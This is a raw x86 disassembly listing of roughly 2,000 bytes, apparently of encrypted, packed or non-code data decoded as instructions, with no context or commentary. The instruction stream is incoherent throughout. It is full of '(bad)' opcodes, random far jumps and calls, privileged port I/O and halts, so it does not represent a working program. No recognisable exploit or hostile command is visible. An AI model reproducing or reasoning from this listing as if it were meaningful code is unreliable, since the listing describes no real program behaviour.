  414787:	mov    ds:0xfa131889,eax
  41478c:	cmp    eax,0xf074f1f9
  414791:	cdq    
  414792:	jae    0x4147b8
  414794:	leave  
  414795:	and    DWORD PTR [eax-0x3ee95bb0],esi
  41479b:	pop    ds
  41479c:	dec    eax
  41479d:	inc    eax
  41479e:	push   es
  41479f:	add    ch,BYTE PTR [ecx]
  4147a1:	mov    al,ds:0x5e6aaec1
  4147a6:	push   esp
  4147a7:	fistp  QWORD PTR [ecx+0x2e]
  4147aa:	(bad)  
  4147ab:	ins    BYTE PTR es:[edi],dx
  4147ac:	and    dh,BYTE PTR [ebp+0x4c]
  4147af:	jo     0x414814
  4147b1:	jns    0x4147d2
  4147b3:	test   eax,0xa0765ed8
  4147b8:	jle    0x41478a
  4147ba:	push   ds
  4147bb:	popf   
  4147bc:	or     eax,0x63602920
  4147c1:	or     eax,0xde55f71a
  4147c6:	mov    dl,bh
  4147c8:	jo     0x4147e3
  4147ca:	or     al,0xbd
  4147cc:	scas   eax,DWORD PTR es:[edi]
  4147cd:	mov    cl,0xc2
  4147cf:	push   esp
  4147d0:	or     esp,DWORD PTR [ebx-0x8bfa578]
  4147d6:	icebp  
  4147d7:	cmp    DWORD PTR [esi],esp
  4147d9:	ss adc eax,0xc9df3cfb
  4147df:	push   ebx
  4147e0:	push   cs
  4147e1:	mov    fs,WORD PTR [edi-0x39f1df09]
  4147e7:	xor    al,0x95
  4147ea:	or     DWORD PTR [edi],ebx
  4147ec:	jne    0x414808
  4147ee:	sub    al,0x83
  4147f0:	jae    0x41477c
  4147f2:	cli    
  4147f3:	jne    0x414821
  4147f5:	jmp    0x41486c
  4147f7:	cmp    edx,DWORD PTR [edx-0x37]
  4147fa:	mov    bl,0x2
  4147fc:	pop    es
  4147fd:	lods   eax,DWORD PTR ds:[esi]
  4147fe:	stos   DWORD PTR es:[edi],eax
  4147ff:	mov    dl,0x2f
  414801:	dec    ebp
  414802:	xor    dl,cl
  414804:	test   al,0xb7
  414806:	scas   al,BYTE PTR es:[edi]
  414807:	lock xchg ebp,eax
  414809:	pop    eax
  41480a:	pop    esp
  41480b:	or     al,0xf2
  41480d:	call   0xfe0c9a6c
  414812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414813:	hlt    
  414814:	push   ecx
  414815:	outs   dx,DWORD PTR ds:[esi]
  414816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414817:	dec    esp
  414818:	inc    ebp
  414819:	scas   eax,DWORD PTR es:[edi]
  41481a:	out    dx,al
  41481b:	jle    0x414897
  41481d:	dec    ecx
  41481e:	out    0xb0,eax
  414820:	or     al,0x21
  414822:	inc    ebp
  414823:	sbb    BYTE PTR [ecx-0x5533e163],bl
  414829:	hlt    
  41482a:	daa    
  41482b:	or     ecx,eax
  41482d:	addr16 loopne 0x41480b
  414830:	call   0xf1a4d5e2
  414835:	data16 cli 
  414837:	cwde   
  414838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414839:	sbb    DWORD PTR [ebp+edx*4-0x3d],esi
  41483d:	pop    ss
  41483e:	pop    ecx
  41483f:	(bad)  
  414840:	and    eax,0x492dee53
  414845:	ins    DWORD PTR es:[edi],dx
  414846:	jnp    0x414875
  414848:	or     DWORD PTR [edx],edx
  41484a:	gs jbe 0x414854
  41484d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41484e:	mov    ds:0x2e51c591,al
  414853:	neg    esp
  414855:	xor    ebp,DWORD PTR [eax*8+0x51f6f06b]
  41485c:	and    DWORD PTR [ebx],eax
  41485e:	jl     0x41488e
  414860:	mul    BYTE PTR [edi-0x246cdefb]
  414866:	aam    0xcc
  414868:	(bad)  
  414869:	fld    TBYTE PTR [ecx-0x5e]
  41486c:	sahf   
  41486d:	sbb    eax,0xc724bd78
  414872:	aam    0x9a
  414874:	clc    
  414875:	xchg   ecx,eax
  414876:	dec    ecx
  414877:	hlt    
  414878:	cmp    eax,0x58717d26
  41487d:	dec    bl
  41487f:	cmp    ecx,DWORD PTR [esi+0x25]
  414882:	cwde   
  414883:	mov    ebp,cs
  414885:	push   eax
  414886:	cmp    BYTE PTR [esi-0x26da25cc],dh
  41488c:	xor    ebp,esp
  41488e:	sub    al,0xa4
  414890:	scas   eax,DWORD PTR es:[edi]
  414891:	test   al,0xd
  414893:	out    0xc4,eax
  414895:	enter  0xb35b,0xd0
  414899:	outs   dx,DWORD PTR ds:[esi]
  41489a:	hlt    
  41489b:	xchg   DWORD PTR [edx],esi
  41489d:	mov    ds:0x7a091c8f,al
  4148a2:	jne    0x414849
  4148a4:	test   DWORD PTR [ebx+ebx*4],ebx
  4148a7:	pop    edx
  4148a8:	jne    0x414904
  4148aa:	mov    ds:0x6d34a8d6,eax
  4148af:	inc    edi
  4148b0:	call   0x5c2b7b0
  4148b5:	push   ebx
  4148b6:	or     DWORD PTR [ecx+0x2e],ecx
  4148b9:	jmp    0xcd1e:0xc879eb37
  4148c0:	push   ecx
  4148c1:	or     BYTE PTR [ebp+0x516fbdd3],al
  4148c7:	mov    cl,0xe4
  4148c9:	pop    ss
  4148ca:	mov    ebp,0xbb84e3a5
  4148cf:	loopne 0x4148fb
  4148d1:	mov    cl,0x49
  4148d3:	shr    BYTE PTR [eax],0x44
  4148d6:	fwait
  4148d7:	sub    bh,BYTE PTR ss:[edi+0x3d]
  4148db:	ret    
  4148dc:	test   BYTE PTR [edx],ah
  4148de:	fcmove st,st(3)
  4148e0:	xchg   esp,eax
  4148e1:	mov    ecx,0xa44ec856
  4148e6:	jl     0x41488c
  4148e8:	aam    0x9c
  4148ea:	xchg   edx,eax
  4148eb:	fwait
  4148ec:	push   edx
  4148ed:	stos   DWORD PTR es:[edi],eax
  4148ee:	mov    DWORD PTR [edx+0x5dd103de],esp
  4148f4:	xor    al,0xff
  4148f6:	jnp    0x41487a
  4148f8:	sub    DWORD PTR [ebx+0x59c6cb58],ebx
  4148fe:	xchg   ebx,eax
  4148ff:	push   ds
  414900:	js     0x41493b
  414902:	rol    DWORD PTR [ecx-0x246d429e],cl
  414908:	pop    edi
  414909:	rcr    DWORD PTR [ebp+0x36],0xe1
  41490d:	repnz xor bl,dh
  414910:	adc    eax,0xb22356a2
  414915:	and    BYTE PTR [ebp+ebx*1-0x35],al
  414919:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41491a:	fs imul esi,ebp,0xb0f81ae6
  414921:	cdq    
  414922:	and    DWORD PTR [ecx-0x7912b04],0xffffffe2
  414929:	jns    0x4149a2
  41492b:	adc    al,0x71
  41492d:	test   al,0xd0
  41492f:	in     al,dx
  414930:	es daa 
  414932:	mul    esp
  414934:	adc    eax,0x3a3d9e49
  414939:	mov    dh,0x5
  41493b:	cmp    ah,BYTE PTR [edi-0x3e]
  41493e:	xchg   cl,bl
  414940:	cs mov dl,0xbe
  414943:	je     0x414917
  414945:	popf   
  414946:	jmp    0x4149a3
  414948:	mov    al,0xb
  41494a:	xor    eax,0xff105ff2
  41494f:	mov    al,ds:0x372f0d23
  414954:	sub    DWORD PTR [edx-0x2ecb9ac],edi
  41495a:	jbe    0x414996
  41495c:	xor    BYTE PTR [ebx+0x2e],ah
  41495f:	jno    0x4149a3
  414961:	fs cld 
  414963:	mov    dh,0xf0
  414965:	ret    
  414966:	ds stc 
  414968:	gs inc ebx
  41496a:	data16 mov fs,WORD PTR ds:0x727c7db
  414971:	(bad)  
  414973:	fiadd  DWORD PTR ds:0xa9b016a5
  414979:	cs (bad) 
  41497b:	sub    al,0xa3
  41497d:	js     0x4149dd
  41497f:	mov    bl,0x83
  414981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414982:	call   0x78edc62f
  414987:	xchg   edi,eax
  414988:	ss inc edi
  41498a:	mov    al,0x79
  41498c:	sbb    edx,DWORD PTR [ecx-0x66197aeb]
  414992:	dec    ebx
  414993:	in     eax,dx
  414994:	inc    ecx
  414995:	mov    dl,0xf
  414997:	sti    
  414998:	and    al,0xc4
  41499a:	dec    edi
  41499c:	nop
  41499d:	call   0xb4e9:0xe4a4294b
  4149a4:	inc    esi
  4149a5:	mov    eax,0x4856f1eb
  4149aa:	sbb    BYTE PTR [eax+esi*8+0x7ff1dfa4],ah
  4149b1:	out    0xdd,eax
  4149b3:	bound  ecx,QWORD PTR [edx]
  4149b5:	gs je  0x41495d
  4149b8:	jecxz  0x4149e4
  4149ba:	outs   dx,BYTE PTR ds:[esi]
  4149bb:	and    esp,DWORD PTR [ebx+eiz*2-0x35004069]
  4149c2:	inc    edx
  4149c3:	and    edx,DWORD PTR [edx+0x26]
  4149c6:	mov    edx,0x6b389cb1
  4149cb:	jno    0x414a18
  4149cd:	sahf   
  4149ce:	mov    BYTE PTR [esi],dh
  4149d0:	push   ds
  4149d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149d2:	int    0xc9
  4149d4:	mov    bl,0xb5
  4149d6:	and    al,0x80
  4149d8:	(bad)  
  4149d9:	js     0x414a05
  4149db:	(bad)  
  4149dd:	scas   al,BYTE PTR es:[edi]
  4149de:	out    dx,eax
  4149df:	out    dx,eax
  4149e0:	push   edx
  4149e1:	sbb    al,0x71
  4149e3:	sub    eax,0x8c05381b
  4149e8:	mov    ecx,0xfc42939f
  4149ed:	push   ecx
  4149ee:	les    ecx,FWORD PTR [ecx+0x6797b79e]
  4149f4:	sub    esp,DWORD PTR [eax+eax*4-0x2a]
  4149f8:	push   ebp
  4149f9:	je     0x414a26
  4149fb:	jecxz  0x414a47
  4149fd:	jbe    0x4149b0
  4149ff:	sti    
  414a00:	mov    al,ds:0xf6d97def
  414a05:	(bad)  
  414a06:	lods   eax,DWORD PTR ds:[esi]
  414a07:	lods   al,BYTE PTR ds:[esi]
  414a08:	stos   DWORD PTR es:[edi],eax
  414a09:	rcr    ecx,1
  414a0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a0c:	jnp    0x414a01
  414a0e:	arpl   si,ax
  414a10:	jecxz  0x4149ee
  414a12:	cmp    eax,0xe0e8614a
  414a17:	jae    0x414a25
  414a19:	mov    al,0xf5
  414a1b:	fnstsw ax
  414a1d:	xor    DWORD PTR [ebx+0x2a3898f2],ebx
  414a23:	or     eax,0x3d41c23d
  414a28:	aas    
  414a29:	popa   
  414a2a:	adc    al,0xb5
  414a2c:	mov    esi,0x4a33c53
  414a31:	addr16 push ss
  414a33:	sub    eax,0x9da44f5
  414a38:	nop
  414a39:	dec    esp
  414a3a:	ret    0xea51
  414a3d:	gs pop eax
  414a3f:	clc    
  414a40:	cmp    cl,bl
  414a42:	push   ebx
  414a43:	fisttp WORD PTR [ebp-0x1b4b1c3a]
  414a49:	dec    ebp
  414a4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a4b:	mov    esi,0x46dbeba3
  414a50:	jl     0x414a3c
  414a52:	xchg   ebx,eax
  414a53:	or     esi,edi
  414a55:	cmp    DWORD PTR [ebx+ebx*1+0x23],esp
  414a59:	ret    0xe84b
  414a5c:	ins    DWORD PTR es:[edi],dx
  414a5d:	adc    al,0xad
  414a5f:	(bad)  
  414a60:	cmp    al,0xec
  414a62:	rcr    BYTE PTR [edx],cl
  414a64:	inc    esi
  414a65:	rol    ebp,cl
  414a67:	in     eax,dx
  414a68:	rcr    BYTE PTR [eax+0x11ed607c],1
  414a6e:	xchg   ebx,eax
  414a6f:	(bad)  
  414a70:	pop    esi
  414a71:	in     al,dx
  414a72:	mov    fs,WORD PTR [edx+ecx*4]
  414a75:	and    al,0x3b
  414a77:	xor    al,0x80
  414a79:	rdmsr  
  414a7b:	lods   al,BYTE PTR ds:[esi]
  414a7c:	into   
  414a7d:	pop    edx
  414a7e:	mov    edi,0x865be148
  414a83:	ja     0x414ab3
  414a85:	inc    edx
  414a86:	or     BYTE PTR [edi+0x7f9cfcd7],bh
  414a8c:	out    dx,eax
  414a8d:	and    eax,0x378cc02a
  414a92:	jg     0x414adc
  414a94:	xor    al,0x7d
  414a96:	sbb    dl,0x54
  414a99:	or     cl,BYTE PTR [edx+esi*4+0x31fd0fd4]
  414aa0:	and    cl,bh
  414aa2:	lock jno 0x414ae5
  414aa5:	dec    ebp
  414aa6:	aad    0xdd
  414aa8:	xchg   BYTE PTR [edx+ebp*2],dl
  414aab:	push   ebx
  414aac:	mov    dh,0x4d
  414aae:	and    BYTE PTR [ebx-0x10],0x94
  414ab2:	push   esi
  414ab3:	mov    edx,0x8f36570d
  414ab8:	jmp    0x1e05:0x46e54ca8
  414abf:	mov    esp,0x598815ba
  414ac4:	aam    0xab
  414ac6:	mov    ecx,0x255063ab
  414acb:	les    ebp,FWORD PTR [ebp+0x6c]
  414ace:	xor    al,0x39
  414ad0:	je     0x414b4f
  414ad2:	data16 mov ah,0xdb
  414ad5:	add    DWORD PTR [esp+esi*2-0x31],ebx
  414ad9:	sub    eax,0x4a6681be
  414ade:	xor    eax,0x216432c4
  414ae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ae4:	lea    ecx,[ebx+0x6b]
  414ae7:	out    dx,al
  414ae8:	fisttp QWORD PTR [edi-0x69]
  414aeb:	push   esp
  414aec:	nop
  414aed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aee:	jp     0x414a80
  414af0:	xor    eax,0xc821a8e6
  414af5:	repz pop ds
  414af7:	jnp    0x414ac5
  414af9:	and    DWORD PTR [ebp-0x726d3b22],ebx
  414aff:	cmp    al,0xd1
  414b01:	jbe    0x414b31
  414b03:	inc    esp
  414b04:	(bad)  
  414b05:	mov    esp,0x4a25f56a
  414b0a:	mov    ebx,0x9f4ad4e9
  414b0f:	inc    ecx
  414b10:	jmp    0x4d5cb51f
  414b15:	xchg   ebx,eax
  414b16:	neg    DWORD PTR [edi-0x54b78743]
  414b1c:	and    edi,ecx
  414b1e:	mov    bl,0x44
  414b20:	lahf   
  414b21:	nop
  414b22:	pop    ebx
  414b23:	push   ebx
  414b24:	in     eax,0x11
  414b26:	inc    edi
  414b27:	mov    esp,0x1651cd9f
  414b2c:	jae    0x414b3a
  414b2e:	mov    dh,0x4a
  414b30:	stos   BYTE PTR es:[edi],al
  414b31:	mov    DWORD PTR ds:0x7e7070db,ebp
  414b37:	bound  esp,QWORD PTR [edi+0xe]
  414b3a:	xchg   esi,eax
  414b3b:	pop    eax
  414b3c:	jecxz  0x414b3f
  414b3e:	cmp    DWORD PTR [ebx-0x1036ae28],ebp
  414b44:	nop
  414b45:	or     esi,edx
  414b47:	inc    ecx
  414b48:	add    DWORD PTR [ebp+0x34],esp
  414b4b:	dec    eax
  414b4c:	or     dl,dh
  414b4e:	xchg   ebp,eax
  414b4f:	or     eax,0x640e18d8
  414b54:	lods   eax,DWORD PTR ds:[esi]
  414b55:	retf   
  414b56:	call   0xe178:0x9ed4e115
  414b5d:	iret   
  414b5e:	fbstp  TBYTE PTR [ecx+0x34]
  414b61:	add    cl,BYTE PTR [eax+0x19]
  414b64:	int3   
  414b65:	inc    edx
  414b66:	out    dx,al
  414b67:	mov    esi,0x5bbc4b0d
  414b6c:	mov    bh,0x45
  414b6e:	or     ah,bh
  414b70:	lods   eax,DWORD PTR ds:[esi]
  414b71:	or     al,0x7e
  414b73:	adc    DWORD PTR [eax+eiz*8-0x7661fbf1],eax
  414b7a:	jns    0x414afd
  414b7c:	hlt    
  414b7d:	mov    bl,0x43
  414b7f:	fldcw  WORD PTR [esp+edi*1+0x5a]
  414b83:	inc    ebx
  414b84:	iret   
  414b85:	jl     0x414bae
  414b87:	mov    ah,0x80
  414b89:	add    al,0x3e
  414b8b:	cmp    ebp,DWORD PTR [ecx+0xed36c97]
  414b91:	aas    
  414b92:	addr16 add eax,0x57dd0db4
  414b98:	icebp  
  414b99:	cmp    ecx,DWORD PTR [ecx]
  414b9b:	add    esp,DWORD PTR [edi]
  414b9d:	pushf  
  414b9e:	sbb    dh,BYTE PTR [esi+0x31164831]
  414ba4:	rol    DWORD PTR [esp+eiz*8-0x1c],1
  414ba8:	call   0x563d:0x8eac19a6
  414baf:	adc    BYTE PTR [ebx],dl
  414bb1:	mov    dh,0xc9
  414bb3:	xchg   edx,eax
  414bb4:	and    DWORD PTR [ebx],edi
  414bb6:	mov    bh,0xf0
  414bb8:	xor    eax,0xfc651db5
  414bbd:	aad    0x31
  414bbf:	sbb    eax,0x3
  414bc2:	mov    WORD PTR [edx+0x6c4f3d0],es
  414bc8:	ror    DWORD PTR [edx+0x839c19c],1
  414bce:	shr    DWORD PTR [edx+0x8],1
  414bd1:	dec    edx
  414bd2:	sub    BYTE PTR [esi+0x1c],cl
  414bd5:	mov    ds:0x871db86b,eax
  414bda:	nop
  414bdb:	out    dx,al
  414bdc:	jmp    0x41d:0xc9ca2c33
  414be3:	loop   0x414c02
  414be5:	mov    edi,0x5db085da
  414bea:	push   ebx
  414beb:	xlat   BYTE PTR ds:[ebx]
  414bed:	pop    es
  414bee:	cs inc ebx
  414bf0:	jg     0x414bc1
  414bf2:	pop    ds
  414bf3:	mov    eax,0x65ca41ff
  414bf8:	arpl   WORD PTR [eax],dx
  414bfa:	mov    ds:0x4b359388,eax
  414bff:	inc    ecx
  414c00:	arpl   WORD PTR [esi+0x7c],dx
  414c03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c04:	scas   al,BYTE PTR es:[edi]
  414c05:	jnp    0x414b8c
  414c07:	jne    0x414be0
  414c09:	outs   dx,BYTE PTR ds:[esi]
  414c0a:	aas    
  414c0b:	cmp    DWORD PTR [edi+0x2acb6070],0xffffffd7
  414c12:	pusha  
  414c13:	in     eax,dx
  414c14:	stos   DWORD PTR es:[edi],eax
  414c15:	push   ebp
  414c16:	or     cl,BYTE PTR [edx+edx*4-0x67ec10eb]
  414c1d:	test   BYTE PTR [esi-0x18fbbe36],0xbd
  414c24:	lock mov esp,0x7c3493c6
  414c2a:	cmp    DWORD PTR ds:0x553fc699,ebp
  414c30:	mov    ecx,0x308bb9ad
  414c35:	ds mov dl,0x67
  414c38:	mov    ebx,DWORD PTR [edx-0x1f]
  414c3b:	add    al,0x32
  414c3d:	sti    
  414c3e:	mov    ebx,0x169e3c2c
  414c43:	data16 fcomp DWORD PTR [esi+edx*1]
  414c47:	pop    ds
  414c48:	inc    ebp
  414c49:	imul   ecx,DWORD PTR [eax+0x4e6c0700],0xffffffde
  414c50:	in     eax,dx
  414c51:	ret    
  414c52:	push   es
  414c53:	pop    ds
  414c54:	loop   0x414be5
  414c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c57:	inc    eax
  414c58:	imul   ecx,DWORD PTR [edx],0x22
  414c5b:	mov    ds:0xd4c713a2,al
  414c60:	push   edi
  414c61:	sbb    BYTE PTR [esi],dl
  414c63:	out    0x47,al
  414c65:	sti    
  414c66:	mov    edx,0xd8fa224d
  414c6b:	addr16 cmc 
  414c6d:	loopne 0x414ce4
  414c6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c70:	pop    edi
  414c71:	dec    esp
  414c72:	dec    eax
  414c73:	repnz fidivr DWORD PTR [edx]
  414c76:	clc    
  414c77:	push   ss
  414c78:	mov    al,ds:0x34f09300
  414c7d:	jne    0x414c5b
  414c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c80:	loope  0x414cc8
  414c82:	xchg   edx,eax
  414c83:	mov    ch,0x2b
  414c85:	(bad)  
  414c86:	and    eax,0xace4bf2a
  414c8b:	mov    eax,0xcbe119c4
  414c90:	sub    ebx,DWORD PTR [ebx-0x1cb92ed8]
  414c96:	and    BYTE PTR [edx],bh
  414c98:	jb     0x414c51
  414c9a:	dec    esp
  414c9b:	rol    BYTE PTR [esi-0x6b],cl
  414c9e:	pop    ebp
  414c9f:	leavew 
  414ca1:	call   0x470a:0xd4bef974
  414ca8:	dec    eax
  414ca9:	xchg   ecx,eax
  414caa:	push   0x5f
  414cac:	inc    ebp
  414cad:	inc    ebp
  414cae:	xor    DWORD PTR [eax],edx
  414cb0:	jae    0x414d16
  414cb2:	mov    edi,esi
  414cb4:	xor    ecx,DWORD PTR [ecx-0x28]
  414cb7:	or     bl,bh
  414cb9:	dec    esp
  414cba:	mov    al,ds:0x394d141
  414cbf:	jno    0x414c98
  414cc1:	jmp    0x88485f59
  414cc6:	int    0x67
  414cc8:	xlat   BYTE PTR ds:[ebx]
  414cc9:	push   ebp
  414cca:	or     eax,0xac059b51
  414ccf:	gs mov ah,dh
  414cd2:	imul   esp,DWORD PTR [ebx-0xc],0xffffffc3
  414cd6:	(bad)  
  414cd7:	mov    edi,0x98265cab
  414cdc:	mov    ecx,DWORD PTR [eax+0x26]
  414cdf:	cld    
  414ce0:	in     eax,0x8d
  414ce2:	ret    
  414ce3:	loopne 0x414cac
  414ce5:	cmp    eax,0x8bde6c18
  414cea:	sbb    eax,0x880f1e97
  414cef:	loop   0x414cd4
  414cf1:	push   ecx
  414cf2:	jnp    0x414cc5
  414cf4:	push   0xa2124e82
  414cf9:	mov    ds:0xfa564a49,eax
  414cfe:	call   0x5ee9:0x55a65e0
  414d05:	scas   eax,DWORD PTR es:[edi]
  414d06:	sar    BYTE PTR [eax+0x42e5baa3],0xa8
  414d0d:	jg     0x414d03
  414d0f:	pop    ds
  414d10:	mov    eax,0xe4fde8b7
  414d15:	outs   dx,DWORD PTR ds:[esi]
  414d16:	push   ss
  414d17:	les    ecx,FWORD PTR [edx-0x6a]
  414d1a:	push   esi
  414d1b:	loopne 0x414d4f
  414d1d:	xor    al,0x85
  414d1f:	xchg   ebx,eax
  414d20:	xchg   esp,eax
  414d21:	ja     0x414cee
  414d23:	sbb    esi,0x76aee9d
  414d29:	add    al,0x25
  414d2b:	and    DWORD PTR [esp+ecx*4+0x31],eax
  414d2f:	cmc    
  414d30:	(bad)
  414d34:	scas   al,BYTE PTR es:[edi]
  414d35:	fmulp  st(3),st
  414d37:	cld    
  414d38:	xor    al,0xfd
  414d3a:	mov    esp,DWORD PTR [edx-0xe40371f]
  414d40:	mov    bl,0x72
  414d42:	(bad)  
  414d43:	vpshad ymm8,xmm3,[ecx+0x7c]
  414d49:	jae    0x414cfa
  414d4b:	or     BYTE PTR [edx+0x75],ch
  414d4e:	xlat   BYTE PTR ds:[ebx]
  414d4f:	sub    DWORD PTR [ecx],ecx
  414d51:	mov    bh,0x38
  414d53:	call   FWORD PTR [eax+0x66]
  414d56:	arpl   WORD PTR [edx-0xe],si
  414d59:	pop    edi
  414d5a:	mov    edx,0xbe52d24a
  414d5f:	popf   
  414d60:	fsub   DWORD PTR [ecx]
  414d62:	out    dx,eax
  414d63:	data16 mov dl,0xd0
  414d66:	lahf   
  414d67:	push   ebp
  414d68:	cmp    eax,0xb8da2867
  414d6d:	imul   edx,esp,0xd7f4b59
  414d73:	push   ecx
  414d74:	sbb    eax,0x10f1c6a8
  414d79:	pop    ss
  414d7a:	rcr    eax,0x6a
  414d7d:	out    0xc7,eax
  414d7f:	inc    ebx
  414d80:	imul   eax,DWORD PTR [eiz*2-0x3315d0b0],0x9e0954
  414d8b:	xchg   esi,eax
  414d8c:	lahf   
  414d8d:	dec    edx
  414d8e:	test   al,0x13
  414d90:	mov    ah,0x9d
  414d92:	clc    
  414d93:	pop    esp
  414d94:	pop    ebx
  414d95:	aas    
  414d96:	mov    eax,ds:0xd805db3d
  414d9b:	jbe    0x414dfd
  414d9d:	adc    BYTE PTR [ebx+ecx*2],bl
  414da0:	dec    eax
  414da1:	scas   eax,DWORD PTR es:[edi]
  414da2:	lea    ecx,[esi]
  414da4:	(bad)  
  414da6:	pop    ebp
  414da7:	cmp    BYTE PTR [edi+0x6b],ch
  414daa:	xchg   ebx,eax
  414dab:	(bad)  
  414dae:	ss jp  0x414d8a
  414db1:	sbb    ebp,DWORD PTR [eax-0x46ddb0c]
  414db7:	add    edx,ebx
  414db9:	and    eax,0x69beeb3c
  414dbe:	lahf   
  414dbf:	js     0x414d71
  414dc1:	or     BYTE PTR [ebx],ah
  414dc3:	mov    dl,0xa
  414dc5:	pop    esp
  414dc6:	cmp    BYTE PTR [esi],0xb0
  414dc9:	pop    edi
  414dca:	les    ebp,FWORD PTR [edx+0x4b]
  414dcd:	std    
  414dce:	pop    ebx
  414dcf:	jb     0x414da8
  414dd1:	mov    ebx,0xc6b814cc
  414dd6:	push   es
  414dd7:	dec    esp
  414dd8:	jg     0x414d8a
  414dda:	mov    eax,0x5410b732
  414ddf:	inc    ebp
  414de0:	adc    DWORD PTR [ecx+0xd99fe69],eax
  414de6:	bound  edx,QWORD PTR [edi+0x392f3f52]
  414dec:	cmp    eax,0x3774ad09
  414df1:	mov    al,al
  414df3:	jecxz  0x414dae
  414df5:	cld    
  414df6:	in     eax,0x8f
  414df8:	mov    edx,0xfaceb5e9
  414dfd:	add    BYTE PTR ds:0x7b10eb69,dh
  414e03:	inc    edi
  414e04:	jno    0x414e6d
  414e06:	sbb    bl,BYTE PTR [ebx]
  414e08:	cld    
  414e09:	and    eax,0x579e24a9
  414e0e:	imul   edi,DWORD PTR [eax],0xae2ac256
  414e14:	lahf   
  414e15:	pop    edi
  414e16:	cmp    bl,BYTE PTR [eax+0x1c]
  414e19:	jno    0x414e4b
  414e1b:	fdiv   DWORD PTR [edi]
  414e1d:	in     eax,0x9e
  414e1f:	stos   DWORD PTR es:[edi],eax
  414e20:	mov    BYTE PTR [ebx],0xb8
  414e23:	fadd   QWORD PTR [ecx]
  414e25:	mov    es,WORD PTR [ebx+eiz*4-0x25]
  414e29:	sbb    ch,ch
  414e2b:	ficomp WORD PTR [edx-0x6351d2e8]
  414e31:	or     eax,0x40ae1a4c
  414e36:	inc    edi
  414e37:	xchg   DWORD PTR [esi+0x1],edi
  414e3a:	imul   esi,DWORD PTR [edx+0x12],0xffffffa1
  414e3e:	leave  
  414e3f:	and    BYTE PTR [edi],ah
  414e41:	(bad)  
  414e42:	aad    0xfe
  414e44:	dec    ebx
  414e45:	(bad)  
  414e46:	mov    ch,0x22
  414e48:	jns    0x414e1d
  414e4a:	imul   ebx
  414e4c:	mov    edx,0x695121e2
  414e51:	cmp    al,0xc4
  414e53:	xchg   ebx,eax
  414e54:	push   ss
  414e55:	pusha  
  414e56:	fs xchg ebp,eax
  414e58:	loope  0x414e7d
  414e5a:	shl    DWORD PTR [edx+0x2f101ea5],0x2e
  414e61:	dec    BYTE PTR [ecx-0x580a2aef]
  414e67:	not    DWORD PTR [ecx+eiz*1-0x28e6a83]
  414e6e:	mov    DWORD PTR [edi],edi
  414e70:	inc    ecx
  414e71:	cmp    ebp,DWORD PTR [esi]
  414e73:	call   0x5f5dc841
  414e78:	mov    ch,0xc4
  414e7a:	push   esi
  414e7b:	mov    DWORD PTR [esi-0x7e],ecx
  414e7e:	outs   dx,BYTE PTR ds:[esi]
  414e7f:	int3   
  414e80:	xlat   BYTE PTR ds:[ebx]
  414e81:	add    al,0x36
  414e83:	popf   
  414e84:	pop    ds
  414e85:	daa    
  414e86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e87:	xor    cl,BYTE PTR [ebp+0x4e]
  414e8a:	jmp    0x5b74dc72
  414e8f:	push   esp
  414e90:	test   BYTE PTR [ebx],cl
  414e92:	repz sbb eax,DWORD PTR [esi-0x76]
  414e96:	add    ah,al
  414e98:	xchg   edi,eax
  414e99:	ret    
  414e9a:	dec    ecx
  414e9b:	adc    al,BYTE PTR [ebx]
  414e9d:	jbe    0x414ec1
  414e9f:	push   ds
  414ea0:	sbb    DWORD PTR [ebp+esi*2+0x12],edx
  414ea4:	mov    ds:0xfdbcfe70,al
  414ea9:	pop    DWORD PTR [ebx+0x20b653a0]
  414eaf:	fadd   DWORD PTR [edi+0x78]
  414eb2:	push   es
  414eb3:	dec    ebp
  414eb4:	push   ebx
  414eb5:	push   eax
  414eb6:	mov    ebx,0x8a783d61
  414ebb:	ds cwde 
  414ebd:	xchg   esp,eax
  414ebe:	inc    ecx
  414ebf:	fmul   DWORD PTR [esi-0x2a414968]
  414ec5:	test   BYTE PTR [ebp+0x79],dl
  414ec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ec9:	and    bl,ch
  414ecb:	jae    0x414ef7
  414ecd:	dec    edx
  414ece:	in     al,dx
  414ecf:	sub    bh,bh
  414ed1:	aad    0x1a
  414ed3:	push   eax
  414ed4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ed5:	inc    edi
  414ed6:	shl    cl,cl
  414ed8:	bound  edi,QWORD PTR [ebp-0x77e36149]
  414ede:	iret   
  414edf:	fadd   st,st(3)
  414ee1:	fidivr WORD PTR [ebx-0x60616f96]
  414ee7:	cmc    
  414ee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ee9:	gs xchg ebx,eax
  414eeb:	adc    al,0xb0
  414eed:	xchg   edx,eax
  414eee:	sbb    edi,DWORD PTR [ebx+eax*8-0x75]
  414ef2:	mov    eax,ds:0x694b9986
  414ef7:	jmp    0xdea4193c
  414efc:	xchg   BYTE PTR [ebx],cl
  414efe:	ror    ch,0x64
  414f01:	ja     0x414f0e
  414f03:	mov    ecx,0x9fdc6a58
  414f08:	push   ss
  414f09:	imul   edx,DWORD PTR [edi+0x1a654ec0],0xffffff91
  414f10:	jo     0x414f02
  414f12:	dec    edi
  414f13:	dec    edx
  414f14:	and    DWORD PTR [edx-0x71],0xc801e340
  414f1b:	test   DWORD PTR [esi+esi*1+0xb],ecx
  414f1f:	pop    es
  414f20:	aaa    
  414f21:	mov    bl,0xca
  414f23:	pop    es
  414f24:	inc    edi
  414f25:	fdiv   QWORD PTR [ebx]
  414f27:	dec    ecx
  414f28:	(bad)  
  414f29:	retf   
  414f2a:	retf   0xb11a
